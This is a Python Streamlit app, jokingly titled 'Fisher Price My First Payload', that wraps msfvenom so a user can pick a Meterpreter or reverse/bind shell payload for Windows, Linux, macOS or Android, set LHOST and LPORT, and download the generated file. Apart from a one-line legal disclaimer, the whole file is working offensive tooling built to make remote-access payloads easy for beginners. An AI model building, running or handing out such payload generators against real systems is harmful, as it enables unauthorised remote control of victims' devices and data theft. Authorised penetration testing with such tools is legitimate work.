import streamlit as st
import subprocess
import os

# Streamlit app
st.title('Fisher Price My First Payload')

# Payload options
payloads = {
    "Reverse TCP Payload for Windows": "windows/meterpreter/reverse_tcp",
    "Bind TCP Payload for Windows": "windows/meterpreter/bind_tcp",
    "Reverse TCP Payload for Linux": "linux/x86/meterpreter/reverse_tcp",
    "Reverse TCP Shell for macOS": "osx/x64/shell_reverse_tcp",
    "Reverse TCP Shell for Android": "android/meterpreter/reverse_tcp"
}

# User inputs
st.header('Select Payload')
payload_option = st.selectbox("Choose your payload:", list(payloads.keys()))
payload = payloads[payload_option]

st.header('Configure Options')
lhost = st.text_input("Enter LHOST (Your IP):")
lport = st.text_input("Enter LPORT (Listening Port):")
format = st.text_input("Enter the format for your payload (e.g., exe, elf, php, raw):")

# Button to generate payload
if st.button('Generate Payload'):
    if not lhost or not lport or not format:
        st.error("Please fill out all the fields.")
    else:
        filename = f"payload.{format}"
        try:
            result = subprocess.run(["msfvenom", "-p", payload, "LHOST=" + lhost, "LPORT=" + lport, "-f", format, "-o", filename],
                                    capture_output=True, text=True, check=True)
            st.success("Payload generated successfully!")
            st.code(result.stdout)
            
            # Provide download link for payload
            with open(filename, "rb") as f:
                st.download_button('Download Payload', f, file_name=filename)
                
        except subprocess.CalledProcessError as e:
            st.error("Error generating payload:")
            st.code(e.stderr)
        except FileNotFoundError:
            st.error("MSFvenom not found. Make sure it is installed and in your system's PATH.")

st.info("Legal and ethical considerations: Always ensure you have explicit permission to use these tools on any network or system.")
